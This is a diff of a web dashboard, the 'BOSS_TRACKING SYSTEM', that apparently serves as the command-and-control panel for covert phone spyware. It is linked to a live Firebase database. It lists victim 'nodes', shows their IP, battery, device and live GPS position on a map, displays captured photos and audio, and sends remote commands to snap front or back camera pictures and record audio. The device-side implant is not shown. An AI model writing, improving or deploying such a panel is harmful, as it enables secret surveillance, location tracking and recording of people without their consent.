@@ -2,136 +2,188 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>BOSS_TRACKING SYSTEM V7.3</title>
+    <title>BOSS_TRACKING SYSTEM V7.6</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
+    
     <style>
-        :root { --neon: #00ff41; --bg: #0a0a0a; --red: #ff3131; }
-        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; }
+        :root { --neon: #00ff41; --bg: #050505; --panel: #0d0d0d; --red: #ff3131; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; overflow: hidden; }
         
-        /* Left Sidebar */
-        .sidebar { width: 300px; border-right: 2px solid #222; overflow-y: auto; background: #000; }
-        .sidebar-title { padding: 15px; background: #111; color: #fff; border-bottom: 2px solid var(--neon); font-weight: bold; }
-        .target-item { padding: 15px; border-bottom: 1px solid #222; cursor: pointer; position: relative; }
-        .target-item:hover { background: #0d0d0d; }
-        .target-item.active { border-left: 5px solid var(--neon); background: #111; }
-        .status-blink { float: right; font-size: 10px; animation: blink 1s infinite; color: var(--neon); }
-        .del-user-btn { position: absolute; right: 10px; bottom: 10px; color: var(--red); border: 1px solid var(--red); padding: 2px 5px; font-size: 10px; cursor: pointer; }
+        /* Sidebar */
+        .sidebar { width: 300px; border-right: 1px solid #222; background: #000; display: flex; flex-direction: column; }
+        .sidebar-header { padding: 20px; border-bottom: 1px solid #222; text-align: center; }
+        .node-list { flex: 1; overflow-y: auto; padding: 10px; }
+        .node-item { border: 1px solid #222; padding: 15px; margin-bottom: 10px; cursor: pointer; position: relative; transition: 0.3s; }
+        .node-item:hover { border-color: var(--neon); background: rgba(0, 255, 65, 0.05); }
+        .node-item.active { border-color: var(--neon); background: rgba(0, 255, 65, 0.1); box-shadow: inset 0 0 10px rgba(0,255,65,0.2); }
+        
+        .status-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; margin-right: 8px; background: #444; }
+        .online { background: var(--neon); box-shadow: 0 0 8px var(--neon); }
+        .watching-tag { font-size: 9px; color: var(--neon); animation: blink 1s infinite; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }
 
-        /* Main Panel */
-        .main { flex: 1; display: flex; flex-direction: column; padding: 20px; overflow-y: auto; }
-        .header { display: flex; justify-content: space-between; margin-bottom: 20px; }
-        .action-btns { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 20px; }
-        .btn { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 10px; cursor: pointer; font-weight: bold; }
-        .btn:hover { background: var(--neon); color: #000; }
+        /* Main Content */
+        .main-content { flex: 1; display: flex; flex-direction: column; background: var(--bg); overflow: hidden; }
+        .header-bar { padding: 15px 25px; background: var(--panel); border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; }
+        
+        .controls { padding: 20px; display: flex; flex-wrap: wrap; gap: 10px; background: #0a0a0a; border-bottom: 1px solid #222; }
+        .btn { background: transparent; border: 1px solid var(--neon); color: var(--neon); padding: 10px 18px; cursor: pointer; font-family: inherit; font-weight: bold; font-size: 12px; }
+        .btn:hover { background: var(--neon); color: #000; box-shadow: 0 0 15px var(--neon); }
         .btn-red { border-color: var(--red); color: var(--red); }
 
-        /* Content Grid */
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
-        .box { background: #111; border: 1px solid #222; padding: 15px; min-height: 200px; }
-        .box h3 { margin-top: 0; border-bottom: 1px solid #333; padding-bottom: 10px; font-size: 14px; }
-        
-        .media-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 10px; }
-        .media-card { border: 1px solid #333; position: relative; }
-        .media-card img { width: 100%; }
-        .del-media { position: absolute; top: 0; right: 0; background: var(--red); color: #fff; border: none; cursor: pointer; }
+        /* Dashboard Grid */
+        .grid { display: grid; grid-template-columns: 1fr 1.2fr; gap: 20px; padding: 20px; overflow-y: auto; }
+        .box { background: var(--panel); border: 1px solid #222; padding: 15px; position: relative; }
+        .box h3 { margin-top: 0; font-size: 14px; border-bottom: 1px solid #222; padding-bottom: 10px; color: #aaa; text-transform: uppercase; }
 
-        @keyframes blink { 50% { opacity: 0; } }
+        /* Map Fix */
+        #map-container { width: 100%; height: 250px; border: 1px solid #333; background: #000; margin-top: 10px; border-radius: 4px; }
+        .leaflet-container { filter: invert(90%) hue-rotate(180deg) brightness(1.2); } /* Dark Mode Map */
+
+        .feed { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 15px; }
+        .media-card { background: #000; border: 1px solid #222; padding: 5px; text-align: center; }
+        .media-card img { width: 100%; border: 1px solid #111; }
+        
+        .del-btn { color: var(--red); cursor: pointer; background: none; border: 1px solid #444; font-size: 10px; padding: 2px 5px; margin-top: 5px; }
+        .protocol-red { color: var(--red); font-weight: bold; text-shadow: 0 0 5px var(--red); }
     </style>
 </head>
 <body>
 
-<div class="sidebar">
-    <div class="sidebar-title">BOSS TRACKING SYSTEM <span style="color:var(--red); font-size:10px;">V7.3</span></div>
-    <div id="target-list"></div>
-</div>
-
-<div class="main" id="admin-ui" style="display:none;">
-    <div class="header">
-        <h2 id="active-id">NODE_XXXXX</h2>
-        <div>
-            <input type="text" id="rename-input" placeholder="Set Name..." style="background:#000; color:#fff; border:1px solid #333; padding:5px;">
-            <button class="btn" onclick="renameTarget()">SAVE NAME</button>
+    <div class="sidebar">
+        <div class="sidebar-header">
+            <h2 style="margin:0; color:var(--neon); font-size:18px;">BOSS_V7 <span class="protocol-red" style="font-size:10px;">SRV_2285</span></h2>
+            <small class="protocol-red">ZOMBIE_PROTOCOL_ACTIVE</small>
         </div>
+        <div class="node-list" id="node-list"></div>
     </div>
 
-    <div class="action-btns">
-        <button class="btn" onclick="sendCmd('photo')">CAPTURE PHOTO</button>
-        <button class="btn" onclick="sendCmd('back_photo')">BACK CAMERA</button>
-        <button class="btn" onclick="sendCmd('audio')">AUDIO RECORD</button>
-        <button class="btn-red btn" onclick="wipeTarget()">DELETE USER DATA</button>
-    </div>
+    <div class="main-content" id="main-ui" style="display:none;">
+        <div class="header-bar">
+            <h3 id="active-target-id" style="margin:0; font-size:16px;">SELECT NODE</h3>
+            <div id="status-info" style="font-size: 11px; color: #888;"></div>
+        </div>
 
-    <div class="grid">
-        <div class="box">
-            <h3>LOGS / DETAILS</h3>
-            <div id="log-data"></div>
+        <div class="controls">
+            <button class="btn" onclick="sendCommand('photo')">📸 FRONT CAPTURE</button>
+            <button class="btn" onclick="sendCommand('back')">📸 BACK CAPTURE</button>
+            <button class="btn" onclick="sendCommand('audio')">🎙️ RECORD AUDIO</button>
+            <button class="btn btn-red" onclick="wipeTargetData()">💀 WIPE NODE DATA</button>
         </div>
-        <div class="box">
-            <h3>MAP_TRACKER</h3>
-            <div id="map-frame"></div>
-        </div>
-        <div class="box" style="grid-column: span 2;">
-            <h3>VISUAL & AUDIO DATA</h3>
-            <div class="media-grid" id="media-feed"></div>
+
+        <div class="grid">
+            <div class="box">
+                <h3>📍 LIVE_LOCATION</h3>
+                <div id="map-container"></div>
+                <div id="loc-data" style="font-size: 11px; margin-top: 10px; color: var(--neon);">COORDS: Waiting...</div>
+            </div>
+            <div class="box">
+                <h3>⚙️ SYSTEM_LOGS</h3>
+                <div id="log-content" style="font-size: 12px; line-height: 1.6;"></div>
+            </div>
+            <div class="box" style="grid-column: span 2;">
+                <h3>📁 INTEL_FEED (Photos & Audio)</h3>
+                <div class="feed" id="intel-feed"></div>
+            </div>
         </div>
     </div>
-</div>
 
 <script>
     const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    let currentID = null;
+    
+    let selectedNode = null;
+    let map, marker;
 
+    // --- NODE LIST SYNC ---
     db.ref('targets').on('value', snap => {
-        const list = document.getElementById('target-list');
+        const list = document.getElementById('node-list');
         list.innerHTML = "";
         snap.forEach(child => {
-            const data = child.val();
             const id = child.key;
-            const isOnline = data.info && data.info.status === "ONLINE";
+            const data = child.val();
+            const isOnline = data.info?.status === "ONLINE";
+            
             list.innerHTML += `
-                <div class="target-item ${currentID === id ? 'active' : ''}" onclick="selectTarget('${id}')">
+                <div class="node-item ${selectedNode == id ? 'active' : ''}" onclick="selectNode('${id}')">
+                    <span class="status-dot ${isOnline ? 'online' : ''}"></span>
                     <strong>${data.customName || id}</strong><br>
-                    <small style="color:#555">${id}</small>
-                    ${isOnline ? '<span class="status-blink">online</span>' : ''}
-                    <div class="del-user-btn" onclick="event.stopPropagation(); deleteUser('${id}')">X</div>
+                    ${isOnline ? '<span class="watching-tag">WATCHING_VIDEO</span>' : ''}
+                    <button class="del-btn" style="float:right;" onclick="event.stopPropagation(); deleteNode('${id}')">X</button>
                 </div>`;
         });
     });
 
-    function selectTarget(id) {
-        currentID = id;
-        document.getElementById('admin-ui').style.display = 'flex';
-        document.getElementById('active-id').innerText = id;
-        
+    function selectNode(id) {
+        selectedNode = id;
+        document.getElementById('main-ui').style.display = 'flex';
+        document.getElementById('active-target-id').innerText = id;
+
         db.ref(`targets/${id}`).on('value', s => {
             const data = s.val() || {};
-            const info = data.info || {};
-            document.getElementById('log-data').innerHTML = `IP: ${info.ip || '--'}<br>Batt: ${info.battery || '--'}<br>Status: ${info.status || 'Offline'}`;
             
+            // Update Logs
+            const info = data.info || {};
+            document.getElementById('log-content').innerHTML = `
+                IP_ADDRESS: <span style="color:#fff;">${info.ip || '---'}</span><br>
+                BATTERY: <span style="color:#fff;">${info.battery || '---'}</span><br>
+                DEVICE: <span style="color:#fff;">${info.device || '---'}</span><br>
+                LAST_ACTIVITY: <span style="color:#fff;">${info.time || '---'}</span>
+            `;
+
+            // Update Map
             if(data.location) {
-                const url = `https://maps.google.com/maps?q=${data.location.lat},${data.location.lng}&z=15&output=embed`;
-                document.getElementById('map-frame').innerHTML = `<iframe src="${url}" width="100%" height="150" style="border:0; filter:invert(90%)"></iframe>`;
+                updateMap(data.location.lat, data.location.lng);
+                document.getElementById('loc-data').innerText = `COORDS: ${data.location.lat.toFixed(5)}, ${data.location.lng.toFixed(5)}`;
             }
 
-            const feed = document.getElementById('media-feed');
+            // Update Intel Feed
+            const feed = document.getElementById('intel-feed');
             feed.innerHTML = "";
-            if(data.photos) Object.entries(data.photos).reverse().forEach(([k, v]) => {
-                feed.innerHTML += `<div class="media-card"><img src="${v.img}"><button class="del-media" onclick="delItem('photos/${k}')">X</button></div>`;
-            });
-            if(data.audios) Object.entries(data.audios).reverse().forEach(([k, v]) => {
-                feed.innerHTML += `<div class="media-card"><audio controls src="${v.data}" style="width:100%"></audio><button class="del-media" onclick="delItem('audios/${k}')">X</button></div>`;
-            });
+            if(data.photos) {
+                Object.entries(data.photos).reverse().forEach(([k, p]) => {
+                    feed.innerHTML += `<div class="media-card"><img src="${p.img}"><br><small>${p.type}</small></div>`;
+                });
+            }
+            if(data.audios) {
+                Object.entries(data.audios).reverse().forEach(([k, a]) => {
+                    feed.innerHTML += `<div class="media-card" style="padding:10px;"><audio src="${a.data}" controls style="width:100%;"></audio></div>`;
+                });
+            }
         });
     }
 
-    function sendCmd(act) { db.ref(`commands/${currentID}`).set({ action: act }); alert("Command Sent!"); }
-    function renameTarget() { db.ref(`targets/${currentID}/customName`).set(document.getElementById('rename-input').value); }
-    function deleteUser(id) { if(confirm("Delete this user entirely?")) db.ref(`targets/${id}`).remove(); }
-    function delItem(path) { db.ref(`targets/${currentID}/${path}`).remove(); }
-    function wipeTarget() { if(confirm("Wipe all data for this node?")) db.ref(`targets/${currentID}`).remove(); }
+    function updateMap(lat, lng) {
+        if (!map) {
+            map = L.map('map-container').setView([lat, lng], 15);
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+            marker = L.marker([lat, lng]).addTo(map);
+        } else {
+            map.setView([lat, lng]);
+            marker.setLatLng([lat, lng]);
+        }
+    }
+
+    function sendCommand(act) {
+        if(!selectedNode) return;
+        db.ref(`commands/${selectedNode}`).set({ action: act, ts: Date.now() });
+        alert("COMMAND_SENT: " + act.toUpperCase());
+    }
+
+    function deleteNode(id) {
+        if(confirm("Confirm Delete Node?")) db.ref(`targets/${id}`).remove();
+    }
+
+    function wipeTargetData() {
+        if(confirm("WIPE ALL DATA?")) {
+            db.ref(`targets/${selectedNode}`).remove();
+            document.getElementById('main-ui').style.display = 'none';
+        }
+    }
 </script>
 </body>
 </html>
